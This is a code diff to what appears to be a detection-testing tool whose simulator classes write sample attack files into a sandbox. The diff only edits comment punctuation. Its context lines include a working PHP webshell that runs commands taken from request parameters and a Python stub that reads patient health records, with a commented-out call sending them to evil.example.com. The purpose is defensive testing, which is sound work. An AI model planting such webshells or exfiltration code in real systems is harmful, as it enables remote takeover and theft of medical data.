@@ -290,7 +290,7 @@ class WebshellSimulator(BaseSimulator):
         fpath = self._sandbox_file("shell.php")
         content = (
             b"<?php\n"
-            b"// Simulated webshell — detection test only\n"
+            b"// Simulated webshell -- detection test only\n"
             b"$cmd = $_GET['cmd'];\n"
             b"passthru($_GET['cmd']);\n"
             b"echo eval(base64_decode($_POST['payload']));\n"
@@ -341,7 +341,7 @@ class DataExfilSimulator(BaseSimulator):
         exfil_script = self._sandbox_file("exfil.py")
         exfil_content = (
             b"import requests\n"
-            b"# SIMULATION ONLY — no real network call\n"
+            b"# SIMULATION ONLY -- no real network call\n"
             b"with open('patients_export.csv') as f:\n"
             b"    health_records = f.read()\n"
             b"# requests.get('http://evil.example.com/exfil', data=health_records)\n"
